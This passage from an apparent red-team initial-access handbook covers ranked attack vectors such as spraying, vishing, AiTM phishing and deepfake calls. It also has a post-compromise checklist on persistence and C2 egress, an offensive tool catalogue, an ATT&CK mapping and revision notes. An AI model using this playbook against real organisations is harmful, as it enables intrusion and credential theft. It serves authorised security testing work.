   tenants (Snowflake-style)
2. CHECK BREACH DATA: valid credentials → test against external services
3. PASSWORD SPRAY against external services (O365, VPN) — slow,
   distributed; expect low yield against modern MFA but useful for
   MFA-gap discovery
4. HELP DESK VISHING for identified users with valid creds but MFA-gated
   (PRE-STAGE OSINT the target's PII; rehearse pretext)
5. EXPLOIT EDGE DEVICES (VPN, firewall) if known vulnerable version
   identified (cross-ref §5 + active recon §4)
6. AITM PHISHING CAMPAIGN → session token theft (bypass MFA)
7. DEVICE CODE / OAUTH CONSENT phishing (cloud-focused targets; verify
   CA Authentication Flows policy first)
8. CLICKFIX / PASTE-AND-RUN for distributed workforce (BYOD targets)
9. MICROSOFT TEAMS EXTERNAL CHAT phishing for high-trust pretext
10. AI-AUGMENTED VISHING (deepfake voice) for executive / finance team
    targets
11. SPEARPHISHING with DLL sideloading payload (if endpoint access needed)
12. EXPLOIT PUBLIC-FACING WEB APPLICATIONS (Confluence, Exchange, etc.)
13. SUBDOMAIN TAKEOVER for highest-credibility phishing infrastructure
14. SUPPLY CHAIN / TRUSTED RELATIONSHIP (long-term, high-effort)
15. PHYSICAL ACCESS / device implant (if in scope and other vectors fail)

═══════════════════════════════════════════════════════════
POST-ACCESS (FIRST 30 MINUTES — TEMPLATE)
═══════════════════════════════════════════════════════════
□ Establish lightweight persistence IMMEDIATELY (SSH key, Run key,
  scheduled task, OAuth app — depending on platform)
□ Identify what user/context you are running as
□ Determine: domain-joined? cloud-only? hybrid?
□ Check for security tools: EDR, AV, monitoring agents (don't probe
  agents; observe presence via process list / file system)
□ Verify egress: can you reach C2? What ports open outbound?
□ Do NOT run noisy enumeration tools yet — observe first
□ Upgrade persistence to more resilient mechanism (Persistence cheatsheet)
□ Begin careful internal reconnaissance
□ Document initial access vector with evidence + timestamps
□ Cloud-side: enumerate OAuth grants (GraphRunner / GraphSpy) for
  SaaS-to-SaaS pivot opportunities
□ Identity-plane: is the compromised user privileged? Which CA policies
  apply to them?
```

---

## 12 — TOOL QUICK REFERENCE (MAINTENANCE STATUS)

```
═══════════════════════════════════════════════════════════
LEGEND: ✅ Active   ⚠ Stalled / Limited   ❌ Dead / Replaced   $ Paid
═══════════════════════════════════════════════════════════

PHISHING / CREDENTIAL THEFT:
  ✅ Evilginx3                AiTM reverse proxy — session token theft
  ✅ muraena                  Maintained alternative to Evilginx;
                              phishlet-compatible
  ❌ Modlishka                ABANDONED upstream since ~2023; do not use
  ✅ GoPhish                  Phishing campaign management framework
                              (note: heavily fingerprinted; modify before
                              operational use)
  ✅ TokenTactics             Device code phishing for Azure/O365
  ✅ TeamFiltration           v3.5.5 (April 2025); O365 enum + spray + exfil
                              (Flangvik)
  ✅ o365enum                 O365 user enumeration
  ✅ MSOLSpray                Azure AD password spraying
  ✅ Trevorspray              Distributed password spraying (multi-IP)
  ✅ Spray365                 Azure/O365 spray with timing controls
  ✅ MailSniper               Microsoft 365 enum + mail-search

COMMERCIAL AiTM-AS-A-SERVICE LANDSCAPE (April 2026):
  ❌ Tycoon 2FA              DISRUPTED March 2026
  ✅ Mamba 2FA               Leading post-Tycoon market share
  ✅ EvilProxy               Subscription model; rising post-disruption
  ✅ Sneaky 2FA              Late-2025 entrant; aggressive obfuscation
  ⚠ ONNX Store               MS-disrupted 2024; variants persist
  ⚠ EvilGoPhish              Open-source; less capable but free

INFOSTEALER LOG / COOKIE HANDLING:
  ✅ RedlineStealer parsers  Structured extraction from log dumps
  ✅ Lumma C2 parser          Extract credentials from Lumma stealer logs
  ✅ chr0mium / chromium-dec  Decrypt Chrome/Edge browser credential stores
  ✅ CookieMonster            Session cookie theft + replay framework
  ✅ Cookie-Editor (ext)      Browser extension for manual cookie import
  $ SpyCloud / Flare /        Defender-side stealer log monitoring
    Constella / IntSights     (know what alerts fire on your creds)
  ✅ HackBrowserData          Browser data extraction (post-ABE forks)
  ✅ WhiteChocolateMacademiaNut DevTools-based cookie extraction (ABE bypass)

POST-ACCESS IDENTITY-PLANE TOOLS (token replay enumeration):
  ✅ GraphRunner              DafThack — comprehensive Graph attack suite
                              (https://github.com/dafthack/GraphRunner)
  ✅ GraphSpy                 Browser-based Graph attack tool with UI
                              (https://github.com/RedByte1337/GraphSpy)
  ✅ TokenSmith               Token management framework
                              (https://github.com/jsa2/TokenSmith)
  ✅ AzureHound               v2.11.0 (March 2026); SpecterOps; Entra ID
                              enumeration (Storm-0501 / Void Blizzard
                              weaponized per MS Aug 2025)
  ✅ ROADtools                dirkjanm; Entra post-cred (some 403 in 2026)
  ✅ AADInternals             Nestori Syynimaa; Entra outsider + post-cred
  ✅ MicroBurst               NetSPI; Azure recon (Oct 2025 update)

PAYLOAD GENERATION:
  ✅ msfvenom                 Metasploit payload generator
  ✅ Cobalt Strike (Artifact Kit)  Custom payload generation ($)
  ✅ Sliver (implants)        Open-source C2 implant generation
  ✅ Havoc (demon)            C2 agent generation
  ✅ Mythic (agents)          C2 framework with multi-agent support
  ✅ SharpDllProxy            DLL sideloading proxy generator
  ✅ Donut                    Shellcode generator from .NET assemblies
  ✅ ScareCrow                Payload creation framework (EDR evasion)

EXPLOITATION:
  ✅ Metasploit               Exploit framework (default payloads heavily
                              signatured; substitute custom for live ops)
  ✅ Nuclei v3                Template-based vulnerability scanner
                              (templates v9 schema; AI-assisted templates)
  ✅ searchsploit             Local ExploitDB search
  ✅ vulncheck-kev            CISA KEV / VulnCheck KEV CLI
  ✅ Nmap NSE                 Service detection + vuln scanning

CLOUD ENUMERATION + EXPLOITATION:
  ✅ AADInternals             Azure AD / Entra ID attack toolkit
  ✅ ROADtools                Azure AD enum + attack (ROADrecon)
  ✅ Pacu                     AWS exploitation framework
  ✅ ScoutSuite               Multi-cloud security audit (NCC Group)
  ✅ Prowler                  Multi-cloud audit
  ✅ CloudFox                 AWS post-cred recon (Bishop Fox)
  ✅ TeamFiltration           O365/Entra enumeration + AiTM
  ✅ aws-account-detective    AWS account ID enumeration (Frichetten)
  ✅ Quiet Riot               AWS principal enumeration
  ✅ gcp_enum / GCP-IAM-PrivEsc  RhinoSecurityLabs; GCP IAM enum
  ✅ GCPBucketBrute           GCS bucket brute force (RhinoSecurityLabs)
  ✅ kube-hunter              K8s vuln scanner (Aqua Security)
  ✅ kubeletctl               Kubelet-API interaction
  ✅ peirates                 K8s pentest swiss-army-knife

INFRASTRUCTURE:
  ✅ GoPhish                  Campaign management
  ✅ Postfix + opendkim       SMTP infrastructure
  ✅ Let's Encrypt (certbot)  TLS certificate automation
  ✅ Apache mod_rewrite       Redirector configuration
  ✅ Cobalt Strike / Sliver / Havoc / Mythic   C2 frameworks

SUBDOMAIN TAKEOVER:
  ✅ subjack                  Subdomain takeover detection
  ✅ Nuclei takeovers/        Subdomain takeover templates
  ✅ can-i-take-over-xyz      Vulnerable-CNAME database
  ✅ SubOver                  Subdomain takeover automation
  ✅ HostileSubBruteforcer    Alternative takeover scanner

PHYSICAL:
  ✅ Proxmark3                RFID/NFC badge cloning
  ✅ Flipper Zero             Multi-protocol wireless tool
  ✅ Hak5 Rubber Ducky        HID keystroke injection
  ✅ Hak5 LAN Turtle          Covert network implant
  ✅ Hak5 Bash Bunny          Multi-vector USB attack
  ✅ O.MG Cable               USB cable with embedded implant
  ✅ Hak5 WiFi Pineapple      Rogue AP for wireless attacks

THREAT INTEL / RECON:
  ✅ Shodan / Censys          Exposed service discovery
  ✅ GreyNoise                Internet background noise classification
  ✅ CISA KEV Catalog         Known Exploited Vulnerabilities list
  ✅ CISA cybersecurity       Recent advisories
     advisories
  ✅ CISA AA23-320A           Scattered Spider joint advisory
                              (last updated July 29, 2025)
  ✅ CISA BOD 26-02           Edge device EOS directive (5 Feb 2026)
  ✅ AADInternals + Get-AADIntTenantID  Entra tenant enumeration
  ✅ linkedin2username        Generate username lists from LinkedIn

PHISHING-PROTOCOL-SPECIFIC:
  ✅ Inveigh                  PowerShell Responder equivalent (Windows)
  ✅ Responder                LLMNR / NBT-NS poisoning (passive analysis -A)

METHODOLOGY REFERENCES:
  MITRE ATT&CK TA0001          https://attack.mitre.org/tactics/TA0001/
  CISA KEV Catalog              https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  CISA AA23-320A                https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a
  CISA BOD 26-02                https://www.cisa.gov/news-events/directives/bod-26-02-mitigating-risk-end-support-edge-devices
  Mandiant M-Trends             https://cloud.google.com/security/resources/m-trends
  Sophos Active Adversary       https://news.sophos.com/en-us/category/threat-research/active-adversary-report/
  CrowdStrike GTR 2025          https://www.crowdstrike.com/en-us/press-releases/crowdstrike-releases-2025-global-threat-report/
  HackTricks                    https://book.hacktricks.wiki/
  The Hacker Recipes            https://www.thehacker.recipes/
  PayloadsAllTheThings          https://github.com/swisskyrepo/PayloadsAllTheThings
  LOLBAS                        https://lolbas-project.github.io/
  GTFOBins                      https://gtfobins.github.io/
```

---

## 13 — MITRE ATT&CK MAPPING MATRIX

```
═══════════════════════════════════════════════════════════
TA0001 INITIAL ACCESS — COMPLETE TECHNIQUE COVERAGE
═══════════════════════════════════════════════════════════

T1078 — Valid Accounts                          → §4, §6, §7
  ├── T1078.001 Default Accounts                → §6.4 (mgmt interfaces)
  ├── T1078.003 Local Accounts                  → §6 (SSH/RDP cred reuse)
  └── T1078.004 Cloud Accounts                  → §4.1 (infostealer chain),
                                                  §7 (cloud + identity)

T1110 — Brute Force                             → §4.2 (password spray)
  ├── T1110.001 Password Guessing               → §6.2 (RDP), §6.3 (SSH)
  ├── T1110.003 Password Spraying               → §4.2
  └── T1110.004 Credential Stuffing             → §4.1 (infostealer logs)

T1133 — External Remote Services                → §6 (VPN/RDP/SSH)

T1189 — Drive-by Compromise                     → §8.8 (watering hole)

T1190 — Exploit Public-Facing Application       → §5 (edge devices + web)

T1195 — Supply Chain Compromise                 → §8
  ├── T1195.001 Compromise Software Dependencies and Tools → §8.4 (CI/CD)
  └── T1195.002 Compromise Software Supply Chain → §8.2 (XZ), §8.3
                                                   (Polyfill)

T1199 — Trusted Relationship                    → §8.7 (MSP/federation)

T1200 — Hardware Additions                      → §9.1, §9.2

T1528 — Steal Application Access Token          → §2.2 (device code),
                                                  §2.5 (OAuth consent)

T1539 — Steal Web Session Cookie                → §4.1 (cookie replay)

T1550 — Use Alternate Authentication Material   → §7.5 (token replay)
  └── T1550.001 Application Access Token        → §2.5, §7.5

T1556 — Modify Authentication Process           → §2.3 (help desk MFA reset)

T1557 — Adversary-in-the-Middle                 → §2.1 (AiTM phishing)

T1566 — Phishing                                → §2
  ├── T1566.001 Spearphishing Attachment        → §3 (payload delivery)
  ├── T1566.002 Spearphishing Link              → §2.1, §2.2, §2.5
  ├── T1566.003 Spearphishing via Service       → §2.7 (Teams external)
  └── T1566.004 Spearphishing Voice             → §2.3 (help desk vishing)

T1574 — Hijack Execution Flow                   → §3.3 (DLL sideload)
  └── T1574.002 DLL Side-Loading                → §3.3

T1091 — Replication Through Removable Media     → §9.2 (USB)

T1204 — User Execution                          → §3
  ├── T1204.001 Malicious Link                  → §2.4 (ClickFix)
  └── T1204.002 Malicious File                  → §3 (LNK + payloads)

T1027 — Obfuscated Files or Information
  └── T1027.006 HTML Smuggling                  → §2.8, §3.4 (SVG smug)

T1218 — Signed Binary Proxy Execution           → §3.2 (LOLBin chains),
                                                  §3.5 (search-ms),
                                                  §3.6 (MSIX)

T1219 — Remote Access Software                  → §3.8 (TeamViewer/AnyDesk
                                                  /ScreenConnect implant)

T1176 — Browser Extensions                      → §3.7 (extension installer)

T1621 — Multi-Factor Authentication Request Generation → §4.3 (push bombing)

T1656 — Impersonation                           → §2.3 (vishing), §2.6
                                                  (deepfake)

T1608 — Stage Capabilities                      → §1 (infrastructure)
  ├── T1608.001 Upload Malware                  → §1
  ├── T1608.002 Upload Tool                     → §1
  ├── T1608.003 Install Digital Certificate     → §1.1
  └── T1608.005 Link Target                     → §2

T1583 — Acquire Infrastructure                  → §1
  ├── T1583.001 Domains                         → §1.1
  └── T1583.002 DNS Server                      → §7.8 (subdomain takeover)

T1585 — Establish Accounts
  ├── T1585.002 Email Accounts                  → §1.3
  └── T1585.003 Cloud Accounts                  → §7

T1588 — Obtain Capabilities
  └── T1588.004 Digital Certificates            → §1.1 (TLS provisioning)

T1497 — Virtualization/Sandbox Evasion          → §3.9

T1606 — Forge Web Credentials
  └── T1606.001 Web Cookies                     → §4.1 (cookie replay)

T1611 — Escape to Host                          → §7.4 (K8s container escape)

T1610 — Deploy Container                        → §7.4 (K8s misconfig)

T1525 — Implant Internal Image / Container Service → §7.4

T1505 — Server Software Component
  └── T1505.003 Web Shell                       → §5 (post-edge-exploit)

T1098 — Account Manipulation
  └── T1098.005 Device Registration             → §2.1 (AiTM compliant-
                                                  device bypass), §7.9 (MDM)

T1136 — Create Account
  └── T1136.003 Cloud Account                   → §2.5 (OAuth persistence),
                                                  §7.7 (SCIM provisioning)
```

---

## CHANGE SUMMARY (vs. prior revision dated 02 April 2026)

**Critical fixes:**
- (None — original document had no Critical errors.)

**Major additions:**
- **§0** — Reframed Decision Matrix with verified Q1-Q2 2026 statistics
  (M-Trends 2025 percentages, Sophos AAR 2025 RDP figures, CrowdStrike
  GTR 2025 vishing surge, CISA BOD 26-02 timing, Salt Typhoon telecom
  context, recent Q1-Q2 2026 mass-exploitation CVEs, Tycoon disruption
  March 2026, post-Tycoon PhaaS landscape).
  Sources: [M-Trends 2025](https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2025) · [Sophos AAR 2025](https://www.sophos.com/en-us/blog/2025-sophos-active-adversary-report) · [CrowdStrike GTR 2025](https://www.crowdstrike.com/en-us/press-releases/crowdstrike-releases-2025-global-threat-report/) · [CISA BOD 26-02](https://www.cisa.gov/news-events/directives/bod-26-02-mitigating-risk-end-support-edge-devices) · [CISA AA23-320A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a) · [Salt Typhoon CRS](https://www.congress.gov/crs-product/IF12798) · [Barracuda Tycoon Disruption April 2026](https://blog.barracuda.com/2026/04/16/threat-spotlight-tycoon-2fa-scattered-everywhere)
- **§0** — Added 2025 victim attribution waves (M&S/Co-op/Harrods Apr-May
  2025; Erie/Philadelphia Insurance/Aflac June 2025; WestJet/Hawaiian/
  Qantas June-July 2025); Jubair arrest Sept 2025.
- **§1.4** — NEW: AiTM proxy infrastructure subsection reflecting post-
  Tycoon-disruption landscape (Mamba 2FA, EvilProxy, Sneaky 2FA leading).
- **§2.1** — Reframed AiTM with current PhaaS landscape; explicit
  Authentication Strengths CA policy context.
- **§2.2** — Device code phishing with Auth Flows enforcement Sept 2024
  context.
- **§2.3** — Help desk vishing expanded with all 2025 victim waves +
  callback-verification + Nametag/Specops defender controls + KQL.
- **§2.6** — NEW: AI-augmented phishing (deepfake voice + LLM hyper-
  personalization); Hong Kong $25M deepfake video call case study.
- **§2.7** — NEW: Microsoft Teams external chat phishing (Midnight
  Blizzard pattern expanded; Storm-2370 follow-on patterns).
- **§2.5** — OAuth consent expanded across Microsoft + Power Platform +
  Logic Apps + Salesforce Connected Apps + AWS IAM Identity Center +
  Google Workspace.
- **§3.4** — NEW: SVG smuggling subsection (popularized 2024).
- **§3.5** — NEW: search-ms protocol abuse (FIN7 June 2024). Source:
  [Trustwave search-ms](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/search-spoof-abuse-of-windows-search-to-redirect-to-malware/)
- **§3.6** — NEW: MSIX installer abuse (ms-appinstaller:// protocol abuse
  pre-Microsoft Feb 2024 disablement).
- **§3.7** — NEW: Browser extension installation as follow-up payload
  (Cyberhaven Dec 2024 supply chain).
- **§3.8** — NEW: Remote-desktop tool as initial-access implant
  (ScreenConnect / AnyDesk / TeamViewer / Splashtop / Atera / Quick
  Assist) — dominant 2024-2026 financial-crime pattern.
- **§4.1** — Infostealer chain expanded with App-Bound Encryption
  (Chrome 127+, Aug 2024) bypass landscape (memory injection, COM
  bypass, DevTools injection); Snowflake mandatory MFA phasing
  (April/August/November 2025); IAB market dynamics + pricing tiers.
  Sources: [Elastic Katz and Mouse](https://www.elastic.co/security-labs/katz-and-mouse-game) · [Snowflake MFA Blog](https://www.snowflake.com/en/blog/multi-factor-identification-default/)
- **§4.2** — Authentication Strengths CA context added (GA March 2023).
- **§5.2** — Edge-appliance CVE matrix extended for Q1-Q2 2026 (Ivanti
  CVE-2025-22457, additional Fortinet/Palo Alto/Citrix/Veeam CVEs).
- **§5.3** — NEW: Web app CVE matrix including SharePoint ToolShell
  (CVE-2025-49706/49704/53770), SAP NetWeaver CVE-2025-31324, Erlang/OTP
  CVE-2025-32433, Confluence CVE-2024-21683, GitLab CVE-2024-45409,
  ConnectWise CVE-2024-1709, Veeam CVE-2025-23120, ServiceNow CVE-2024-4879,
  Windows AFD.sys CVE-2024-38193 (Lazarus). Sources: [Unit 42 ToolShell](https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/) · [Rapid7 SAP](https://www.rapid7.com/blog/post/2025/04/28/etr-active-exploitation-of-sap-netweaver-visual-composer-cve-2025-31324/) · [Unit 42 Erlang](https://unit42.paloaltonetworks.com/erlang-otp-cve-2025-32433/) · [Huntress ScreenConnect](https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass)
- **§5.4** — NEW: Cloud-native CVE matrix including IngressNightmare
  (CVE-2025-1097), runc Leaky Vessels (CVE-2024-21626), ArgoCD CVEs.
  Source: [Wiz IngressNightmare](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities)
- **§7** — RESTRUCTURED: Cloud section reorganized into per-provider
  subsections (R2):
  * §7.1 AWS extended (IAM Identity Center session hijack, Lambda
    Function URLs, API Gateway, ECR Public typosquatting, Cognito
    misconfig expanded, Console federation login, SCP bypass,
    public EBS snapshot, IMDSv2)
  * §7.2 Azure extended (Managed Identity abuse, PIM elevation, cross-
    tenant access policy abuse — Storm-0501 pattern, SP credential
    abuse, CA enumeration, AzureHound v2.11)
  * §7.3 GCP fully expanded (SA impersonation chains, Workload Identity
    Federation, GKE Workload Identity, Workspace OAuth, BigQuery
    cross-project, Cloud Run / Cloud Functions discovery, GCP org
    policy bypass)
  * §7.4 Kubernetes extended (kubelet vs API server defaults
    correction, RBAC enum, SA token theft from pod metadata,
    privileged container abuse, K8s secrets extraction)
  * §7.5 NEW: Identity-plane post-foothold (GraphRunner, GraphSpy,
    TokenSmith, AzureHound, ROADtools, Microsoft Graph direct queries)
  * §7.6 NEW: SaaS-to-SaaS OAuth pivot (Q1 2026 dominant cross-SaaS
    vector)
  * §7.7 NEW: SCIM API abuse for cross-IdP provisioning
  * §7.8 NEW: Subdomain takeover for phishing infrastructure
  * §7.9 NEW: Mobile MDM / device enrollment abuse
- **§8** — Supply chain expanded:
  * §8.3 NEW: Polyfill.io (June 2024) — 100K+ websites, CDN hijack
    deep-dive. Source: [Sonatype Polyfill](https://www.sonatype.com/blog/polyfill.io-supply-chain-attack-hits-100000-websites-all-you-need-to-know)
  * §8.4 NEW: tj-actions/changed-files (March 2025; CVE-2025-30066) —
    23K repos. Source: [CISA tj-actions](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction)
  * §8.5 NEW: Other 2024-2025 supply chain incidents summary
    (Cyberhaven Chrome extension, Phantom/Solana, Ledger npm,
    Ultralytics PyPI, Lottie Player JS, 3CX continuing, SolarWinds
    ripple)
  * §8.6 NEW: CI/CD pipeline compromise patterns (GitHub Actions
    self-hosted runners, build-time secret extraction, workflow
    abuse patterns)
  * §8.7 Trusted Relationship expanded with Salt Typhoon telecom
    context (CALEA system access; SMS/voice MFA implications).
- **§9** — USB-C PD abuse note (BadUSB-PD 2024 research).
- **§10** — Detection table extended with new techniques; NEW Defender
  Stack Reference subsection (parallel to active recon §9.X) with
  per-product visibility map; NEW Q1 2026 MDCA "Suspicious OAuth app
  activity" alert reference.
- **§10.6** — KQL hunts extended for ToolShell exploitation, AzureHound
  enumeration pattern, cross-tenant access policy abuse, remote-tool
  implant install, IngressNightmare exploitation, SaaS-to-SaaS OAuth
  pivot.
- **§11** — Operational checklist extended with Authentication Strengths
  / Auth Flows / Token Protection pre-attempt validation steps; cloud-
  side OAuth grant enumeration in post-access template.
- **§12** — Tool reference restructured with maintenance-status legend
  (✅/⚠/❌/$); explicit canonical-repo references; post-access identity-
  plane tools section (GraphRunner, GraphSpy, TokenSmith).
- **§13** — NEW: Standalone MITRE ATT&CK matrix mapping each technique
  ID to subsection coverage; previously-missing T1606.001 (cookie
  replay), T1611 (container escape), T1505.003 (web shell),
  T1098.005 (device registration), T1136.003 (cloud account creation)
  added.

**Reframing:**
- Document preamble added explicit OPSEC taxonomy (STEALTH / SUCCESS
  RATE / SKILL / DETECTION COST) parallel to active/passive recon docs.
- Banner format applied per technique: MITRE ATT&CK ID, STEALTH/SUCCESS/
  SKILL ratings, DETECTION fields, OPSEC RATING.
- Per-technique cross-references via §X.Y notation throughout.
- Tool maintenance-status legend matches series convention.

**Removed:**
- Tycoon 2FA presented as "highest-volume" — corrected to disrupted
  March 2026.
- Generic "Modlishka" usage guidance — flagged ❌ ABANDONED.
- Implication that all standard MFA bypasses help desk vishing —
  reframed as MFA-bypass pattern targeting the human authorizer.

---

## OUTSTANDING ITEMS — UNVERIFIED / EMERGING / CONTESTED

| Item | Status | Evidence Required to Resolve |
|---|---|---|
| Cyberhaven Chrome extension (Dec 2024) compromise scope | **Confirmed historical (industry reporting widespread)** but exact victim count not in primary sources. | Cyberhaven post-incident report or Chrome Web Store enforcement disclosure. |
| Ultralytics PyPI / @solana/web3.js / Lottie Player JS supply chain incidents (Dec 2024) | **Unverified at primary-source level** — referenced widely in industry but specific incident reports not surfaced in research. | Vendor-specific advisories / CVE assignments. |
| ClickOnce manifest abuse by Konni / North Korea | **Unverified** — referenced in industry but not directly attributable in research. | Mandiant / Microsoft Threat Intel attribution report. |
| Microsoft search-ms abuse FIN7 attribution | **Partial** — protocol abuse confirmed (Trustwave June 2024); FIN7 connection less directly established. | Specific FIN7 attribution report by Mandiant / CrowdStrike. |
| Tycoon 2FA disruption date and attribution | **Confirmed (March 2026, Barracuda reporting)** — but full law-enforcement attribution unclear; similar to Genesis Market disruption pattern. | Public DOJ announcement when/if released. |
| Snowflake mandatory MFA timeline phasing | **Confirmed** — April 2025 enrollment, August 2025 required, November 2025 full enforcement. | Snowflake official blog. |
| Modlishka maintenance status | **Confirmed effectively abandoned** — minimal commits since 2023; superseded operationally by Evilginx3 / muraena. | Periodic GitHub commit-history check. |
| muraena maintenance status | **Confirmed active** — actively maintained as of Q1 2026 per GitHub commit activity. | Periodic check. |
| GraphRunner / GraphSpy / TokenSmith maintenance | **Confirmed active** — all three have 2024-2025 documented operator usage. | Periodic check. |
| AzureHound weaponization attribution (Storm-0501, Void Blizzard) | **Confirmed historical (Aug 2025 MS reporting)** but threat actor attribution evolves. | Microsoft Threat Intelligence latest reporting. |
| Auth Flows policy enforcement timeline | **Confirmed** — added Q4 2023; enforcement Sept 2024 per MS Learn. | MS Learn page check at time of use. |
| K8s v1.36 fine-grained kubelet authz GA | **Confirmed (24 April 2026)** — but production fleet adoption gradual; many sub-1.36 clusters persist. | Per-engagement K8s version audit. |
| App-Bound Encryption bypass viability (Chrome 127+) | **Volatile** — cat-and-mouse documented through 2025 by Elastic; new bypasses + new Chrome mitigations alternate. | Elastic Security Labs latest research. |
| ConnectWise ScreenConnect CVE-2024-1709 | **Confirmed mass exploitation Feb 2024** — documented by Huntress, CISA. | Vendor advisories. |
| Stealer-log marketplace operational status | **Volatile** — same as passive recon §6.2 outstanding item. | Continuous monitoring via threat intel feeds. |
| AI-driven phishing tooling efficacy | **Emerging** — limited public validation; CrowdStrike GTR cites 442% vishing surge tied to GenAI but specific tool fingerprinting incomplete. | Field research through 2026. |
| Subdomain takeover monitoring vendor coverage | **Stable but evolving** — HudsonRock, Detectify, RiskIQ DEASM all cover; per-vendor coverage matrix shifts quarterly. | Vendor sites at time of procurement. |

---

***Valid as of 28 April 2026***

*Mapped to: MITRE ATT&CK TA0001 (Initial Access). Full technique coverage in §13. Companion documents: §01 Passive Reconnaissance · §02 Active Reconnaissance · §04 Persistence · §05 Privilege Escalation · §06 Lateral Movement · §07 Exfiltration · §08 Active Directory · §09-12 Web/App/Mobile/Wireless · §13 Wireless.*
